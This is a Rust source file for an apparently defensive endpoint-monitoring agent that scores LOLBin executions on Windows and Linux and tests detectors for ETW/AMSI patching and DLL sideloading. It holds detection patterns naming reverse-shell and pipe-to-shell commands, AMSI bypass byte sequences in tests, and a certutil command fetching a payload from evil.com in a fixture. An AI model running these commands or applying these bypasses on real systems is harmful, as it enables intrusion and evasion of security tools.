impl DefenseEvasionCollector {
    /// Monitor for suspicious LOLBin execution on Windows.
    /// Scans running processes for known LOLBins and scores them based on
    /// command-line suspiciousness, parent process anomaly, time-of-day,
    /// and user context.
    #[cfg(target_os = "windows")]
    async fn monitor_lolbin_execution(tx: mpsc::Sender<TelemetryEvent>, interval_ms: u64) {
        use super::{DetectionType, LolbinExecutionEvent};
        use std::collections::HashMap;
        use sysinfo::System;

        info!("Starting LOLBin behavioral baselining monitor (T1218)");

        let mut system = System::new_all();
        let mut interval = tokio::time::interval(tokio::time::Duration::from_millis(interval_ms));

        // Track reported (pid) to avoid duplicate events per process lifetime
        let mut reported_pids: HashSet<u32> = HashSet::new();

        // Track per-hour execution counts for time-of-day anomaly detection
        // Maps (lolbin_name_lowercase) -> [count_per_hour; 24]
        let mut hourly_baseline: HashMap<String, [u32; 24]> = HashMap::new();
        // Total observations used to determine if we have enough baseline data
        let mut total_observations: u64 = 0;

        loop {
            interval.tick().await;

            system.refresh_processes();

            // Prune reported_pids: remove PIDs no longer running
            reported_pids.retain(|pid| system.process(sysinfo::Pid::from_u32(*pid)).is_some());

            let current_hour = {
                use std::time::SystemTime;
                let secs = SystemTime::now()
                    .duration_since(SystemTime::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_secs();
                ((secs % 86400) / 3600) as u8
            };

            for (pid, process) in system.processes() {
                let pid_u32 = pid.as_u32();

                if reported_pids.contains(&pid_u32) {
                    continue;
                }

                let process_name = process.name().to_string();
                let process_name_lower = process_name.to_lowercase();

                // Check if this process is a known LOLBin
                let is_lolbin = LOLBINS.iter().any(|l| process_name_lower == *l);
                if !is_lolbin {
                    continue;
                }

                let exe_path = process
                    .exe()
                    .map(|p| p.to_string_lossy().to_string())
                    .unwrap_or_default();
                let cmdline = process.cmd().join(" ");
                let cmdline_lower = cmdline.to_lowercase();

                // Update hourly baseline
                let hour_counts = hourly_baseline
                    .entry(process_name_lower.clone())
                    .or_insert([0u32; 24]);
                hour_counts[current_hour as usize] =
                    hour_counts[current_hour as usize].saturating_add(1);
                total_observations += 1;

                // === Score Calculation ===
                let mut risk_score: f32 = 0.0;
                let mut matched_patterns: Vec<String> = Vec::new();

                // 1. Command-line argument suspiciousness (0.0 - 0.5)
                if let Some((_, patterns)) = LOLBIN_SUSPICIOUS_ARGS
                    .iter()
                    .find(|(name, _)| process_name_lower == *name)
                {
                    for (pattern, description) in *patterns {
                        if cmdline_lower.contains(&pattern.to_lowercase()) {
                            matched_patterns.push(format!("{}: {}", pattern, description));
                            risk_score += 0.15; // Each matched pattern adds 0.15
                        }
                    }
                    // Cap argument score at 0.5
                    if risk_score > 0.5 {
                        risk_score = 0.5;
                    }
                }

                // 2. Parent process anomaly (0.0 - 0.25)
                let parent_pid = process.parent().map(|p| p.as_u32()).unwrap_or(0);
                let parent_name = if parent_pid > 0 {
                    system
                        .process(sysinfo::Pid::from_u32(parent_pid))
                        .map(|p| p.name().to_string())
                        .unwrap_or_else(|| "unknown".to_string())
                } else {
                    "unknown".to_string()
                };
                let parent_name_lower = parent_name.to_lowercase();

                let parent_anomaly = !LOLBIN_NORMAL_PARENTS
                    .iter()
                    .any(|p| parent_name_lower == *p);

                if parent_anomaly {
                    risk_score += 0.25;
                    matched_patterns.push(format!(
                        "unusual parent process: {} (PID {})",
                        parent_name, parent_pid
                    ));
                }

                // 3. Time-of-day deviation (0.0 - 0.15)
                // After gathering enough baseline data (~500 observations),
                // flag executions during hours with very low historical activity
                if total_observations > 500 {
                    let hour_counts = hourly_baseline
                        .get(&process_name_lower)
                        .copied()
                        .unwrap_or([0; 24]);
                    let total_for_bin: u32 = hour_counts.iter().sum();
                    if total_for_bin > 20 {
                        let hour_ratio =
                            hour_counts[current_hour as usize] as f32 / total_for_bin as f32;
                        // If this hour accounts for < 2% of historical executions,
                        // it is unusual
                        if hour_ratio < 0.02 {
                            risk_score += 0.15;
                            matched_patterns.push(format!(
                                "unusual time of day: hour {} ({:.1}% of baseline)",
                                current_hour,
                                hour_ratio * 100.0
                            ));
                        } else if hour_ratio < 0.05 {
                            risk_score += 0.08;
                        }
                    }
                }

                // 4. User context (0.0 - 0.10)
                // Elevated / admin context increases risk
                let is_elevated = {
                    #[cfg(target_os = "windows")]
                    {
                        // Check if the process runs elevated
                        // Simplified: check if current user has admin group
                        // or if the process name is in system context
                        process
                            .user_id()
                            .map(|uid| {
                                uid.to_string().contains("S-1-5-18")
                                    || uid.to_string().contains("S-1-5-32-544")
                            })
                            .unwrap_or(false)
                    }
                    #[cfg(not(target_os = "windows"))]
                    {
                        false
                    }
                };

                if is_elevated {
                    risk_score += 0.10;
                    matched_patterns.push("running in elevated/admin context".to_string());
                }

                // Cap total risk score at 1.0
                if risk_score > 1.0 {
                    risk_score = 1.0;
                }

                // Only generate events for LOLBins with risk score above threshold
                // Low threshold (0.1) to capture even mildly suspicious activity
                if risk_score < 0.10 {
                    continue;
                }

                // Mark as reported
                reported_pids.insert(pid_u32);

                let user = process
                    .user_id()
                    .map(|uid| uid.to_string())
                    .unwrap_or_else(|| "unknown".to_string());

                let (mitre_technique, mitre_description) =
                    lolbin_mitre_technique(&process_name_lower);

                let severity = if risk_score >= 0.7 {
                    Severity::High
                } else if risk_score >= 0.4 {
                    Severity::Medium
                } else {
                    Severity::Low
                };

                debug!(
                    lolbin = %process_name,
                    pid = %pid_u32,
                    risk_score = %risk_score,
                    patterns = ?matched_patterns,
                    parent = %parent_name,
                    "LOLBin execution scored"
                );

                let lolbin_event = LolbinExecutionEvent {
                    process_name: process_name.clone(),
                    process_path: exe_path.clone(),
                    pid: pid_u32,
                    ppid: parent_pid,
                    parent_name: parent_name.clone(),
                    cmdline: cmdline.clone(),
                    user: user.clone(),
                    is_elevated,
                    risk_score,
                    matched_patterns: matched_patterns.clone(),
                    parent_anomaly,
                    mitre_technique: mitre_technique.to_string(),
                    mitre_description: mitre_description.to_string(),
                    hour_of_day: current_hour,
                };

                let mut event = TelemetryEvent::new(
                    EventType::LolbinExecution,
                    severity,
                    EventPayload::LolbinExecution(lolbin_event),
                );

                let pattern_summary = if matched_patterns.is_empty() {
                    "baseline observation".to_string()
                } else {
                    matched_patterns.join("; ")
                };

                event.add_detection(Detection {
                    detection_type: DetectionType::LolbinAbuse,
                    rule_name: format!("lolbin_{}", process_name_lower.replace('.', "_")),
                    confidence: risk_score,
                    description: format!(
                        "LOLBin execution: {} (PID {}) with risk score {:.2}. {}",
                        process_name, pid_u32, risk_score, pattern_summary
                    ),
                    mitre_tactics: vec!["defense-evasion".to_string(), "execution".to_string()],
                    mitre_techniques: vec![mitre_technique.to_string()],
                });

                event
                    .metadata
                    .insert("risk_score".to_string(), format!("{:.2}", risk_score));
                event
                    .metadata
                    .insert("lolbin".to_string(), process_name.clone());
                event
                    .metadata
                    .insert("parent_process".to_string(), parent_name.clone());
                event
                    .metadata
                    .insert("mitre_technique".to_string(), mitre_technique.to_string());
                event.metadata.insert(
                    "mitre_description".to_string(),
                    mitre_description.to_string(),
                );
                event
                    .metadata
                    .insert("hour_of_day".to_string(), current_hour.to_string());

                if tx.send(event).await.is_err() {
                    warn!("Event channel closed");
                    return;
                }
            }
        }
    }

    /// Monitor for suspicious LOLBin execution on Linux.
    /// Linux LOLBins include bash, python, curl, wget, etc.
    #[cfg(target_os = "linux")]
    async fn monitor_lolbin_execution_linux(tx: mpsc::Sender<TelemetryEvent>, interval_ms: u64) {
        use super::{DetectionType, LolbinExecutionEvent};
        use sysinfo::System;

        info!("Starting Linux LOLBin behavioral baselining monitor");

        // Linux LOLBins / GTFOBins
        let linux_lolbins: HashSet<&str> = [
            "bash",
            "sh",
            "dash",
            "zsh",
            "python",
            "python3",
            "python2",
            "perl",
            "ruby",
            "php",
            "lua",
            "awk",
            "gawk",
            "nawk",
            "curl",
            "wget",
            "fetch",
            "nc",
            "ncat",
            "netcat",
            "socat",
            "openssl",
            "nmap",
            "ssh",
            "scp",
            "sftp",
            "rsync",
            "tar",
            "zip",
            "unzip",
            "gzip",
            "bzip2",
            "xz",
            "find",
            "xargs",
            "env",
            "nice",
            "time",
            "strace",
            "ltrace",
            "gcc",
            "g++",
            "make",
            "at",
            "crontab",
            "systemctl",
            "journalctl",
            "dd",
            "base64",
            "xxd",
            "hexdump",
            "busybox",
            "docker",
            "kubectl",
            "nsenter",
            "unshare",
        ]
        .iter()
        .cloned()
        .collect();

        // Suspicious Linux LOLBin argument patterns
        let linux_suspicious_args: &[(&str, &[(&str, &str)])] = &[
            (
                "curl",
                &[
                    ("-o /tmp/", "download to temp directory"),
                    ("| bash", "pipe to shell execution"),
                    ("| sh", "pipe to shell execution"),
                    ("-k", "insecure TLS (ignore cert errors)"),
                ],
            ),
            (
                "wget",
                &[
                    ("-O /tmp/", "download to temp directory"),
                    ("-q", "quiet download (evasion)"),
                    ("| bash", "pipe to shell execution"),
                ],
            ),
            (
                "python",
                &[
                    ("-c import", "inline Python execution"),
                    ("socket", "Python socket for reverse shell"),
                    ("pty.spawn", "PTY spawn for shell upgrade"),
                    ("subprocess", "subprocess execution"),
                    ("http.server", "HTTP server start"),
                ],
            ),
            (
                "python3",
                &[
                    ("-c import", "inline Python execution"),
                    ("socket", "Python socket for reverse shell"),
                    ("pty.spawn", "PTY spawn for shell upgrade"),
                    ("subprocess", "subprocess execution"),
                    ("http.server", "HTTP server start"),
                ],
            ),
            (
                "bash",
                &[
                    ("-i >& /dev/tcp/", "reverse shell via bash"),
                    ("-c 'curl", "download execution via bash"),
                    ("-c 'wget", "download execution via bash"),
                ],
            ),
            (
                "nc",
                &[
                    ("-e /bin/", "reverse shell via netcat"),
                    ("-lp", "listening netcat (bind shell)"),
                    ("-lvp", "verbose listening netcat"),
                ],
            ),
            (
                "openssl",
                &[
                    ("s_client", "TLS client connection"),
                    ("enc -d", "decryption operation"),
                    ("enc -e", "encryption operation"),
                ],
            ),
            ("base64", &[("-d", "Base64 decode (potential payload)")]),
            (
                "dd",
                &[
                    ("if=/dev/", "raw device read"),
                    ("of=/dev/", "raw device write"),
                ],
            ),
        ];

        let linux_normal_parents: HashSet<&str> = [
            "bash", "sh", "dash", "zsh", "sshd", "systemd", "init", "cron", "crond", "atd",
            "screen", "tmux", "su", "sudo", "login", "getty", "agetty",
        ]
        .iter()
        .cloned()
        .collect();

        let mut system = System::new_all();
        let mut interval = tokio::time::interval(tokio::time::Duration::from_millis(interval_ms));
        let mut reported_pids: HashSet<u32> = HashSet::new();

        loop {
            interval.tick().await;

            system.refresh_processes();

            reported_pids.retain(|pid| system.process(sysinfo::Pid::from_u32(*pid)).is_some());

            let current_hour = {
                use std::time::SystemTime;
                let secs = SystemTime::now()
                    .duration_since(SystemTime::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_secs();
                ((secs % 86400) / 3600) as u8
            };

            for (pid, process) in system.processes() {
                let pid_u32 = pid.as_u32();
                if reported_pids.contains(&pid_u32) {
                    continue;
                }

                let process_name = process.name().to_string();
                let process_name_lower = process_name.to_lowercase();

                if !linux_lolbins.contains(process_name_lower.as_str()) {
                    continue;
                }

                let exe_path = process
                    .exe()
                    .map(|p| p.to_string_lossy().to_string())
                    .unwrap_or_default();
                let cmdline = process.cmd().join(" ");
                let cmdline_lower = cmdline.to_lowercase();

                let mut risk_score: f32 = 0.0;
                let mut matched_patterns: Vec<String> = Vec::new();

                // Check suspicious arguments
                for (bin, patterns) in linux_suspicious_args {
                    if process_name_lower == *bin || process_name_lower.starts_with(bin) {
                        for (pattern, description) in *patterns {
                            if cmdline_lower.contains(&pattern.to_lowercase()) {
                                matched_patterns.push(format!("{}: {}", pattern, description));
                                risk_score += 0.15;
                            }
                        }
                    }
                }
                if risk_score > 0.5 {
                    risk_score = 0.5;
                }

                // Parent process anomaly
                let parent_pid = process.parent().map(|p| p.as_u32()).unwrap_or(0);
                let parent_name = if parent_pid > 0 {
                    system
                        .process(sysinfo::Pid::from_u32(parent_pid))
                        .map(|p| p.name().to_string())
                        .unwrap_or_else(|| "unknown".to_string())
                } else {
                    "unknown".to_string()
                };
                let parent_name_lower = parent_name.to_lowercase();

                let parent_anomaly = !linux_normal_parents.contains(parent_name_lower.as_str());

                if parent_anomaly && parent_name_lower != "unknown" {
                    risk_score += 0.20;
                    matched_patterns.push(format!("unusual parent: {}", parent_name));
                }

                // Elevated context (UID 0 = root)
                let is_elevated = process
                    .user_id()
                    .map(|uid| uid.to_string() == "0")
                    .unwrap_or(false);

                if is_elevated {
                    risk_score += 0.10;
                    matched_patterns.push("running as root".to_string());
                }

                if risk_score > 1.0 {
                    risk_score = 1.0;
                }

                if risk_score < 0.10 {
                    continue;
                }

                reported_pids.insert(pid_u32);

                let user = process
                    .user_id()
                    .map(|uid| uid.to_string())
                    .unwrap_or_else(|| "unknown".to_string());

                let severity = if risk_score >= 0.7 {
                    Severity::High
                } else if risk_score >= 0.4 {
                    Severity::Medium
                } else {
                    Severity::Low
                };

                let lolbin_event = LolbinExecutionEvent {
                    process_name: process_name.clone(),
                    process_path: exe_path.clone(),
                    pid: pid_u32,
                    ppid: parent_pid,
                    parent_name: parent_name.clone(),
                    cmdline: cmdline.clone(),
                    user: user.clone(),
                    is_elevated,
                    risk_score,
                    matched_patterns: matched_patterns.clone(),
                    parent_anomaly,
                    mitre_technique: "T1218".to_string(),
                    mitre_description: "System Binary Proxy Execution".to_string(),
                    hour_of_day: current_hour,
                };

                let mut event = TelemetryEvent::new(
                    EventType::LolbinExecution,
                    severity,
                    EventPayload::LolbinExecution(lolbin_event),
                );

                let pattern_summary = if matched_patterns.is_empty() {
                    "baseline observation".to_string()
                } else {
                    matched_patterns.join("; ")
                };

                event.add_detection(Detection {
                    detection_type: DetectionType::LolbinAbuse,
                    rule_name: format!("lolbin_{}", process_name_lower.replace('.', "_")),
                    confidence: risk_score,
                    description: format!(
                        "LOLBin execution: {} (PID {}) with risk score {:.2}. {}",
                        process_name, pid_u32, risk_score, pattern_summary
                    ),
                    mitre_tactics: vec!["defense-evasion".to_string(), "execution".to_string()],
                    mitre_techniques: vec!["T1218".to_string()],
                });

                event
                    .metadata
                    .insert("risk_score".to_string(), format!("{:.2}", risk_score));
                event
                    .metadata
                    .insert("lolbin".to_string(), process_name.clone());
                event
                    .metadata
                    .insert("parent_process".to_string(), parent_name.clone());

                if tx.send(event).await.is_err() {
                    return;
                }
            }
        }
    }
}

// Simple base64 decoder for AMSI bypass detection
#[cfg(target_os = "windows")]
mod base64 {
    pub fn decode(input: &str) -> Result<Vec<u8>, ()> {
        const ALPHABET: &[u8; 64] =
            b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

        let input = input.trim().replace(['\n', '\r', ' '], "");
        let input = input.trim_end_matches('=');

        if input.is_empty() {
            return Ok(Vec::new());
        }

        let mut output = Vec::with_capacity(input.len() * 3 / 4);
        let mut buffer: u32 = 0;
        let mut bits_collected = 0;

        for c in input.chars() {
            let value = match ALPHABET.iter().position(|&x| x == c as u8) {
                Some(v) => v as u32,
                None => return Err(()),
            };

            buffer = (buffer << 6) | value;
            bits_collected += 6;

            if bits_collected >= 8 {
                bits_collected -= 8;
                output.push((buffer >> bits_collected) as u8);
                buffer &= (1 << bits_collected) - 1;
            }
        }

        Ok(output)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_evasion_type_mitre_mapping() {
        assert_eq!(
            EvasionType::SecurityToolTampering.mitre_technique(),
            "T1562.001"
        );
        assert_eq!(EvasionType::EventLogClearing.mitre_technique(), "T1070.001");
        assert_eq!(EvasionType::Timestomping.mitre_technique(), "T1070.006");
        assert_eq!(EvasionType::VmDetection.mitre_technique(), "T1497.001");
    }

    #[test]
    fn test_evasion_type_severity() {
        assert_eq!(
            EvasionType::SecurityToolTampering.severity(),
            Severity::Critical
        );
        assert_eq!(EvasionType::EventLogClearing.severity(), Severity::High);
        assert_eq!(
            EvasionType::BrowserHistoryClearing.severity(),
            Severity::Low
        );
        assert_eq!(EvasionType::VmDetection.severity(), Severity::Medium);
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn test_base64_decode() {
        let decoded = base64::decode("SGVsbG8gV29ybGQ=").unwrap();
        assert_eq!(String::from_utf8(decoded).unwrap(), "Hello World");
    }

    // === EDR Blinding Detection Tests ===

    #[test]
    fn test_new_evasion_type_mitre_mappings() {
        assert_eq!(
            EvasionType::CredentialGuardBypass.mitre_technique(),
            "T1003.001"
        );
        assert_eq!(
            EvasionType::EventLogServiceTamper.mitre_technique(),
            "T1070.001"
        );
        assert_eq!(
            EvasionType::EtwProviderUnregister.mitre_technique(),
            "T1562.006"
        );
    }

    #[test]
    fn test_new_evasion_type_severities() {
        assert_eq!(
            EvasionType::CredentialGuardBypass.severity(),
            Severity::Critical
        );
        assert_eq!(
            EvasionType::EventLogServiceTamper.severity(),
            Severity::Critical
        );
        assert_eq!(
            EvasionType::EtwProviderUnregister.severity(),
            Severity::High
        );
    }

    #[test]
    fn test_new_evasion_type_as_str() {
        assert_eq!(
            EvasionType::CredentialGuardBypass.as_str(),
            "credential_guard_bypass"
        );
        assert_eq!(
            EvasionType::EventLogServiceTamper.as_str(),
            "event_log_service_tamper"
        );
        assert_eq!(
            EvasionType::EtwProviderUnregister.as_str(),
            "etw_provider_unregister"
        );
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn test_classify_etw_patch_ret() {
        // 0xC3 = ret at function start
        let bytes = [
            0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00,
        ];
        let result = DefenseEvasionCollector::classify_etw_patch(&bytes, &None);
        assert!(result.contains("ret at function start"));
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn test_classify_etw_patch_xor_eax_ret() {
        // 0x33 0xC0 0xC3 = xor eax,eax; ret
        let bytes = [
            0x33, 0xC0, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00,
        ];
        let result = DefenseEvasionCollector::classify_etw_patch(&bytes, &None);
        assert!(result.contains("xor eax,eax; ret"));
        assert!(result.contains("STATUS_SUCCESS"));
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn test_classify_etw_patch_xor_alt_encoding() {
        // 0x31 0xC0 0xC3 = alternate xor eax,eax; ret
        let bytes = [
            0x31, 0xC0, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00,
        ];
        let result = DefenseEvasionCollector::classify_etw_patch(&bytes, &None);
        assert!(result.contains("xor eax,eax; ret"));
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn test_classify_etw_patch_mov_eax_ret() {
        // B8 xx xx xx xx C3 = mov eax, imm32; ret
        let bytes = [
            0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00,
        ];
        let result = DefenseEvasionCollector::classify_etw_patch(&bytes, &None);
        assert!(result.contains("mov eax"));
        assert!(result.contains("hardcoded value"));
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn test_classify_etw_patch_jmp_rel32() {
        // E9 xx xx xx xx = JMP rel32
        let bytes = [
            0xE9, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00,
        ];
        let result = DefenseEvasionCollector::classify_etw_patch(&bytes, &None);
        assert!(result.contains("JMP rel32"));
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn test_classify_etw_patch_nop_sled() {
        let bytes = [
            0x90, 0x90, 0x90, 0x90, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00,
        ];
        let result = DefenseEvasionCollector::classify_etw_patch(&bytes, &None);
        assert!(result.contains("NOP sled"));
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn test_classify_etw_patch_int3() {
        let bytes = [
            0xCC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00,
        ];
        let result = DefenseEvasionCollector::classify_etw_patch(&bytes, &None);
        assert!(result.contains("INT3 breakpoint"));
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn test_classify_etw_patch_indirect_jmp() {
        // FF 25 = JMP [rip+disp32]
        let bytes = [
            0xFF, 0x25, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00,
        ];
        let result = DefenseEvasionCollector::classify_etw_patch(&bytes, &None);
        assert!(result.contains("indirect jump"));
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn test_classify_amsi_patch_e_invalidarg() {
        // B8 57 00 07 80 C3 = mov eax, 0x80070057; ret (AMSI bypass)
        let bytes = [
            0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00,
        ];
        let result = DefenseEvasionCollector::classify_amsi_patch(&bytes);
        assert!(result.contains("E_INVALIDARG"));
        assert!(result.contains("AMSI bypass"));
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn test_classify_amsi_patch_ret() {
        let bytes = [
            0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00,
        ];
        let result = DefenseEvasionCollector::classify_amsi_patch(&bytes);
        assert!(result.contains("ret at function start"));
        assert!(result.contains("AMSI disabled"));
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn test_classify_amsi_patch_xor_ret() {
        let bytes = [
            0x33, 0xC0, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00,
        ];
        let result = DefenseEvasionCollector::classify_amsi_patch(&bytes);
        assert!(result.contains("S_OK"));
        assert!(result.contains("AMSI bypass"));
    }

    // === DLL Sideloading & LOLBin Detection Tests ===

    #[test]
    fn test_dll_sideloading_evasion_type() {
        assert_eq!(EvasionType::DllSideloading.mitre_technique(), "T1574.002");
        assert_eq!(EvasionType::DllSideloading.severity(), Severity::High);
        assert_eq!(EvasionType::DllSideloading.as_str(), "dll_sideloading");
    }

    #[test]
    fn test_lolbin_execution_evasion_type() {
        assert_eq!(EvasionType::LolbinExecution.mitre_technique(), "T1218");
        assert_eq!(EvasionType::LolbinExecution.severity(), Severity::High);
        assert_eq!(EvasionType::LolbinExecution.as_str(), "lolbin_execution");
    }

    #[test]
    fn test_sideload_vulnerable_list_populated() {
        // Ensure the sideloading vulnerability list is populated
        assert!(!SIDELOAD_VULNERABLE.is_empty());
        // Check a known pair exists
        assert!(SIDELOAD_VULNERABLE
            .iter()
            .any(|(exe, dll)| { *exe == "MpCmdRun.exe" && *dll == "MpClient.dll" }));
        assert!(SIDELOAD_VULNERABLE
            .iter()
            .any(|(exe, dll)| { *exe == "teams.exe" && *dll == "version.dll" }));
    }

    #[test]
    fn test_sideload_expected_paths_populated() {
        assert!(!SIDELOAD_EXPECTED_PATHS.is_empty());
        // MpCmdRun.exe should have Windows Defender paths
        let mpcmdrun = SIDELOAD_EXPECTED_PATHS
            .iter()
            .find(|(name, _)| *name == "MpCmdRun.exe");
        assert!(mpcmdrun.is_some());
        let (_, paths) = mpcmdrun.unwrap();
        assert!(paths.iter().any(|p| p.contains("Windows Defender")));
    }

    #[test]
    fn test_is_expected_path_system_dir() {
        // Executables running from system directories should be expected
        assert!(DefenseEvasionCollector::is_expected_path(
            "SomeUnknown.exe",
            "C:\\Windows\\System32\\SomeUnknown.exe"
        ));
        assert!(DefenseEvasionCollector::is_expected_path(
            "SomeUnknown.exe",
            "C:\\Program Files\\SomeApp\\SomeUnknown.exe"
        ));
    }

    #[test]
    fn test_is_expected_path_unexpected() {
        // Executables running from temp or user directories should be unexpected
        assert!(!DefenseEvasionCollector::is_expected_path(
            "SomeUnknown.exe",
            "C:\\Users\\Public\\Downloads\\SomeUnknown.exe"
        ));
        assert!(!DefenseEvasionCollector::is_expected_path(
            "SomeUnknown.exe",
            "C:\\Temp\\SomeUnknown.exe"
        ));
    }

    #[test]
    fn test_is_expected_path_known_exe() {
        // MpCmdRun.exe in expected directory
        assert!(DefenseEvasionCollector::is_expected_path(
            "MpCmdRun.exe",
            "C:\\Program Files\\Windows Defender\\MpCmdRun.exe"
        ));
        // MpCmdRun.exe in unexpected directory
        assert!(!DefenseEvasionCollector::is_expected_path(
            "MpCmdRun.exe",
            "C:\\Users\\Public\\Downloads\\MpCmdRun.exe"
        ));
    }

    #[test]
    fn test_lolbin_list_populated() {
        assert!(!LOLBINS.is_empty());
        // Check key LOLBins are present
        assert!(LOLBINS.contains(&"certutil.exe"));
        assert!(LOLBINS.contains(&"mshta.exe"));
        assert!(LOLBINS.contains(&"powershell.exe"));
        assert!(LOLBINS.contains(&"cmd.exe"));
        assert!(LOLBINS.contains(&"rundll32.exe"));
        assert!(LOLBINS.contains(&"regsvr32.exe"));
        assert!(LOLBINS.contains(&"bitsadmin.exe"));
        assert!(LOLBINS.contains(&"wmic.exe"));
        assert!(LOLBINS.contains(&"msbuild.exe"));
    }

    #[test]
    fn test_lolbin_suspicious_args_populated() {
        assert!(!LOLBIN_SUSPICIOUS_ARGS.is_empty());
        // Certutil should have download patterns
        let certutil = LOLBIN_SUSPICIOUS_ARGS
            .iter()
            .find(|(name, _)| *name == "certutil.exe");
        assert!(certutil.is_some());
        let (_, patterns) = certutil.unwrap();
        assert!(patterns.iter().any(|(pat, _)| *pat == "-urlcache"));
        assert!(patterns.iter().any(|(pat, _)| *pat == "-decode"));
    }

    #[test]
    fn test_lolbin_mitre_technique_mapping() {
        assert_eq!(
            lolbin_mitre_technique("certutil.exe"),
            ("T1140", "Deobfuscate/Decode Files")
        );
        assert_eq!(lolbin_mitre_technique("mshta.exe"), ("T1218.005", "Mshta"));
        assert_eq!(
            lolbin_mitre_technique("rundll32.exe"),
            ("T1218.011", "Rundll32")
        );
        assert_eq!(
            lolbin_mitre_technique("regsvr32.exe"),
            ("T1218.010", "Regsvr32")
        );
        assert_eq!(
            lolbin_mitre_technique("powershell.exe"),
            ("T1059.001", "PowerShell")
        );
        assert_eq!(
            lolbin_mitre_technique("cmd.exe"),
            ("T1059.003", "Windows Command Shell")
        );
        assert_eq!(
            lolbin_mitre_technique("bitsadmin.exe"),
            ("T1197", "BITS Jobs")
        );
        assert_eq!(
            lolbin_mitre_technique("wmic.exe"),
            ("T1047", "Windows Management Instrumentation")
        );
        // Unknown LOLBin should fallback to generic T1218
        assert_eq!(
            lolbin_mitre_technique("unknown.exe"),
            ("T1218", "System Binary Proxy Execution")
        );
    }

    #[test]
    fn test_lolbin_normal_parents_populated() {
        assert!(!LOLBIN_NORMAL_PARENTS.is_empty());
        assert!(LOLBIN_NORMAL_PARENTS.contains(&"explorer.exe"));
        assert!(LOLBIN_NORMAL_PARENTS.contains(&"svchost.exe"));
        assert!(LOLBIN_NORMAL_PARENTS.contains(&"cmd.exe"));
        assert!(LOLBIN_NORMAL_PARENTS.contains(&"powershell.exe"));
    }

    #[test]
    fn test_dll_sideload_event_type_mapping() {
        let evasion = DefenseEvasionEvent {
            evasion_type: EvasionType::DllSideloading,
            pid: 1234,
            process_name: "MpCmdRun.exe".to_string(),
            process_path: "C:\\Temp\\MpCmdRun.exe".to_string(),
            cmdline: String::new(),
            user: "admin".to_string(),
            target: "MpClient.dll".to_string(),
            details: "DLL sideloading detected".to_string(),
            original_value: None,
            new_value: None,
        };
        let event = DefenseEvasionCollector::create_evasion_event(&evasion);
        assert_eq!(event.event_type, EventType::DllSideload);
    }

    #[test]
    fn test_lolbin_execution_event_type_mapping() {
        let evasion = DefenseEvasionEvent {
            evasion_type: EvasionType::LolbinExecution,
            pid: 5678,
            process_name: "certutil.exe".to_string(),
            process_path: "C:\\Windows\\System32\\certutil.exe".to_string(),
            cmdline: "certutil.exe -urlcache -split -f http://evil.com/payload.exe payload.exe"
                .to_string(),
            user: "admin".to_string(),
            target: "certutil.exe".to_string(),
            details: "LOLBin execution detected".to_string(),
            original_value: None,
            new_value: None,
        };
        let event = DefenseEvasionCollector::create_evasion_event(&evasion);
        assert_eq!(event.event_type, EventType::LolbinExecution);
    }
}
